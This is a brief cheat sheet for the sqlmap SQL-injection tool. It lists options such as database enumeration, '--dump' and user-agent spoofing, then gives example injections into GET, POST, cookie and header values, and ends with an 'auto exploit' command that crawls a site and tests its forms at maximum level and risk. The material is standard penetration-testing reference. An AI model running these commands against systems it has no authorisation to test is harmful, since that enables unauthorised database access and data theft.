## SQLmap
#### Options
```sh
sqlmap -u "http://example.com/?id=1"
-u #URL
-p #Parameter
--data #POST data
--cookie #Cookie
--headers #Headers
--method #Method
--level=5 #Level of testing (1-5) The level number is the depth of the test
--risk=2 #Risk of testing (1-3) 
--batch #Batch mode non interactive mode 
--crawl=1 #The number is the depth of the crawl. This option will crawl the target website and find all the links
--forms #Test forms This option will test all forms found on the target page
--threads=1 #Number of threads 
--random-agent #Random agent This option will make the requests look more like they are coming from a browser
--dbs #List databases
-D #Select a specific Database
-T #Select a specific Table
--dump #Dump the data 
```

#### Examples
```sh
#in a GET
sqlmap -u "http://example.com/?id=1"
sqlmap -u "http://example.com/?id=1" -p id
#in a POST
sqlmap -u "http://example.com" --data "username=*&password=*"
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"
#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"
#PUT Method inside header
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"
```
#### SQLMAP Auto Exploit
```sh
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
```